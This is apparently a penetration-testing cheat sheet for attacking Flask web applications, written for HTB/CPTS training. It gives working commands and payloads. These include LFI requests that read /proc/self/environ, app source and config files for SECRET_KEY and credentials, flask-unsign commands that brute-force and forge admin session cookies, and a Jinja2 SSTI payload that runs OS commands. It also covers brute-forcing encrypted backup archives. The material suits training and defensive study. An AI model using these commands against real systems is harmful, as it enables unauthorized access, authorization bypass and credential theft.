# Flask

#Flask #Python #WSGI #Jinja2 #SSTI #SECRET_KEY #Blueprints #webservices #LFI #RCE

## What is Flask?

Flask is a lightweight **Python web framework** (WSGI, built on **Werkzeug** + **Jinja2**). It ships no ORM/auth/admin — you wire those yourself — so the security story is *whatever the developer wrote*: signed-but-not-encrypted session cookies, server-side templates, and glue code calling `subprocess`/`os`. It's the framework behind a huge share of HTB web boxes and internal tools. You typically meet it on **TCP 5000** (dev default; also 8000/8080/8888 behind gunicorn/nginx), and it's often paired with an **arbitrary-file-read / LFI** bug — which is the master key here, because Flask apps are *readable Python*: pull the source and the entire attack surface falls out.

- Built on **Werkzeug** (WSGI + the debug console) and **Jinja2** (templates) — see [[Services/Web Services/Werkzeug|Werkzeug]] for the debug-console/PIN RCE.
- Session state lives in a **client-side signed cookie** (not server-side) — signed with `SECRET_KEY`, **not encrypted**.
- Routing is often split across **Blueprints** (`api_*.py` modules) registered in `app.py`.

---

## Tools

| Tool | Use |
|---|---|
| [[Tools/Web/Burpsuite\|Burp Suite]] | Intercept requests, tamper JSON bodies/session cookies, spot Jinja `{{ }}` reflection |
| [[Tools/File Transfer/cURL\|curl]] | Pull source/config via the LFI; craft JSON POSTs to blueprint endpoints |
| [[Tools/Scanning/ffuf\|ffuf]] | Fuzz routes/params (Flask has no forced route naming) |
| [flask-unsign](https://github.com/Paradoxis/Flask-Unsign) | Decode / **forge** Flask session cookies once you have `SECRET_KEY`; also brute-forces weak keys |
| [SSTImap](https://github.com/vladko312/SSTImap) | Detect + exploit Jinja2 SSTI (maintained `tplmap` successor) |
| [[Tools/Web/Arjun\|Arjun]] | Discover hidden JSON/body params on endpoints |

---

## Typical layout (what to expect / what to read)

```text
app.py / main.py / wsgi.py   ← entrypoint: creates app, registers blueprints, SECRET_KEY
config.py / settings.py      ← SECRET_KEY, DB URI, creds, feature flags   ← HIGH VALUE
requirements.txt             ← every dependency + version (pip freeze)    ← recon goldmine
utils.py / models.py         ← helper logic, DB access, hashing
api_*.py / blueprints/*.py   ← the actual route handlers (the vuln lives here)
templates/*.html             ← Jinja2 templates (SSTI sink if rendered from input)
static/                      ← css/js
.env                         ← secrets when using python-dotenv
instance/                    ← instance config, sometimes a sqlite DB
```

Common absolute roots: `/app/`, `/home/<user>/<app>/`, `/opt/<app>/`, `/srv/`. Leak the real one from `/proc/self/environ` (`PWD`/`HOME`) — see [[Class notes/HTB Academy/CPTS v2 (claude)/File Inclusion|File Inclusion]] → `/proc/self/environ`.

---

## Enumeration / Fingerprinting

```bash
# Fingerprint Flask/Werkzeug
curl -sI http://<target>:5000/ | grep -i "server"          # "Werkzeug/x.y.z Python/3.z"
curl -s  http://<target>:5000/doesnotexist                 # debug mode → Werkzeug traceback page
nmap -p 5000,8000,8080 --script http-title,http-headers -sV <target>

# Session cookie = Flask? (base64 dot-separated, starts 'eyJ...' but NOT a JWT)
#   value.timestamp.signature  → decode with flask-unsign
curl -si http://<target>:5000/ | grep -i set-cookie
```

---

## Attack Vectors

### 1. LFI → read the source → map the app

The highest-leverage move: Flask source *is* the app logic. Pull, in order:

```bash
curl "http://<t>/?file=/proc/self/environ" | tr '\0' '\n'   # find HOME/PWD → the app dir
curl "http://<t>/?file=/app/app.py"                          # entrypoint + SECRET_KEY + blueprint imports
curl "http://<t>/?file=/app/config.py"                       # SECRET_KEY, DB creds
curl "http://<t>/?file=/app/requirements.txt"                # dependency recon (see loot below)
```

### 2. Blueprint enumeration (find the hidden endpoints)

`app.py` registers routing modules — read every one it imports. Endpoints (and their auth checks) that aren't linked anywhere in the UI live here.

```python
# app.py reveals the map:
from api_auth   import bp_auth
from api_upload import bp_upload
from api_edit   import bp_edit      # ← read api_edit.py — undocumented routes hide here
from api_admin  import bp_admin
```

```bash
# Pull each blueprint via the LFI, then grep them for sinks (don't read top-to-bottom)
for m in api_auth api_upload api_edit api_admin api_misc utils; do
  curl -s "http://<t>/?file=/app/$m.py"; done > src.txt
grep -nE "shell=True|os\.system|os\.popen|subprocess|render_template_string|pickle|yaml\.load|\.route\(" src.txt
```

> [!tip] This is exactly how you find, say, `api_edit.py`'s hidden `apply_visual_transform` among six blueprints with no naming hint — **grep for the sink, don't read everything.** Sink signatures + the `subprocess(shell=True)` red flag: [[Class notes/HTB Academy/CPTS v2 (claude)/Command Injection|Command Injection]].

### 3. Session cookie forgery via `SECRET_KEY`

Flask sessions are **signed, not encrypted** — the browser can read them, and anyone with `SECRET_KEY` can **forge** them. Endpoints gate on session keys (`session.get('is_admin')`, `session['is_testuser_account']`), so forging the right key is an instant authz bypass.

```bash
# Decode a session cookie (readable without the key)
flask-unsign --decode --cookie 'eyJ...'

# No SECRET_KEY yet? Brute-force weak/default keys
flask-unsign --unsign --cookie 'eyJ...' --wordlist /usr/share/wordlists/flask-keys.txt

# Have SECRET_KEY (from config.py/LFI)? Forge any session
flask-unsign --sign --cookie "{'username':'admin','is_admin':True,'is_testuser_account':True}" --secret '<SECRET_KEY>'
```

### 4. SSTI — Jinja2 template injection

If user input reaches `render_template_string()` (or a template rendered with `{{ }}` around request data), Jinja2 evaluates it → RCE.

```bash
{{7*7}}                       # → 49 confirms SSTI
{{config}}                    # dumps Flask config incl. SECRET_KEY
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
```

Full payloads/polyglots and sandbox-escape chains: [[Class notes/HTB Academy/CPTS v2 (claude)/Server-Side Attacks|Server-Side Attacks]] / [[Class notes/HTB Academy/CPTS v2 (claude)/Non-PHP Web App Attacks|Non-PHP Web App Attacks]].

### 5. Command injection in glue code

Handlers that build a shell string from request data are the classic Flask RCE (image processors, PDF/report generators, ping/whois tools):

```python
command = f"{CONVERT} {infile} -crop {params['width']}x{params['height']} {outfile}"
subprocess.run(command, shell=True, check=True)      # 🚩 shell=True + f-string on user input
```

The signal is **`shell=True` + interpolation**, not `subprocess` itself → [[Class notes/HTB Academy/CPTS v2 (claude)/Command Injection|Command Injection]]. Reverse shells (incl. the Python `pty.spawn` one-liner): [[Class notes/HTB Academy/CPTS v2 (claude)/Shells & Payloads|Shells & Payloads]].

### 6. Werkzeug debug console

`debug=True` exposes an interactive Python console at `/console` (PIN-gated but calculable via LFI). This is a full note on its own: [[Services/Web Services/Werkzeug|Werkzeug]].

### 7. Dependency recon & backup loot (`requirements.txt` → the unexpected thing)

`requirements.txt` (pip-freeze output) lists **every** installed package, including ones used by scripts *outside* the web blueprints. That's how you'd know a box uses, e.g., **`pyAesCrypt`** — which points you at **encrypted backup archives**:

```bash
curl -s "http://<t>/?file=/app/requirements.txt"          # spot pyAesCrypt / paramiko / boto3 / etc.

# pyAesCrypt defaults to appending .aes → hunt readable encrypted backups
#   (via a shell, or the same LFI file-by-file)
find /var/backup /var/backups /opt /home -name '*.aes' 2>/dev/null

# Crack the archive: dictionary-brute the password with pyAesBrute (see below)
python3 pybrute.py /usr/share/wordlists/rockyou.txt backup.aes backup.tar

# Or, if you already know/guess the password, decrypt directly
pip install pyAesCrypt
python3 -c "import pyAesCrypt; pyAesCrypt.decryptFile('backup.aes','backup.tar','<password>')"
```

Cracking an `.aes` password: [[Tools/Auth/pyAesBrute|pyAesBrute]] (dictionary brute-forcer for AES Crypt / pyAesCrypt files).

> [!tip] Treat `requirements.txt` as an intel source, not a formality: each package hints at functionality (and a possible CVE). `pyAesCrypt`→`.aes` backups, `paramiko`→SSH creds in code, `boto3`→cloud keys, `PyJWT`→token handling, `flask-sqlalchemy`→a DB URI in config. Harvested creds → [[Class notes/HTB Academy/CPTS v2 (claude)/Linux Priv Esc|Linux Priv Esc]].

---

## Dangerous Settings

| Setting | Risk |
|---|---|
| `app.run(debug=True)` / `FLASK_DEBUG=1` in prod | Werkzeug console → RCE (see [[Services/Web Services/Werkzeug\|Werkzeug]]) |
| Hard-coded / weak `SECRET_KEY` | Session cookie forgery → authz bypass / account takeover |
| `SECRET_KEY` in a world-readable `config.py` reachable via LFI | Same, handed to you |
| `render_template_string()` on user input | Jinja2 **SSTI** → RCE |
| `subprocess(..., shell=True)` with request data | **Command injection** → RCE |
| Secrets passed as env vars | Readable via `/proc/self/environ` (LFI) |
| Blueprints with per-session-key gates only | Forge the session key → reach "hidden" features |
| App run as root / no unprivileged service user | Any RCE is instant root |

---

## Quick Reference

| Goal | Command / payload |
|---|---|
| Fingerprint | `curl -sI host:5000` → `Server: Werkzeug/… Python/…` |
| Trigger debug traceback | `curl host:5000/doesnotexist` |
| Read source (LFI) | `?file=/app/app.py` → follow `import bp_*` to `api_*.py` |
| Find app dir | `?file=/proc/self/environ` → `PWD`/`HOME` |
| Decode session | `flask-unsign --decode --cookie 'eyJ...'` |
| Brute SECRET_KEY | `flask-unsign --unsign --cookie 'eyJ...' --wordlist keys.txt` |
| Forge session | `flask-unsign --sign --cookie "{'is_admin':True}" --secret '<KEY>'` |
| SSTI probe | `{{7*7}}` → `{{config}}` → `__import__('os').popen('id')` |
| RCE sink grep | `grep -nE 'shell=True|render_template_string|os\.(system|popen)' *.py` |
| Dependency recon | `?file=/app/requirements.txt` → pyAesCrypt → hunt `*.aes` |
| Debug console RCE | `/console` (+ PIN calc) → [[Services/Web Services/Werkzeug\|Werkzeug]] |

---

*Created: 2026-08-14*
*Updated: 2026-08-14*
*Model: claude-opus-5*
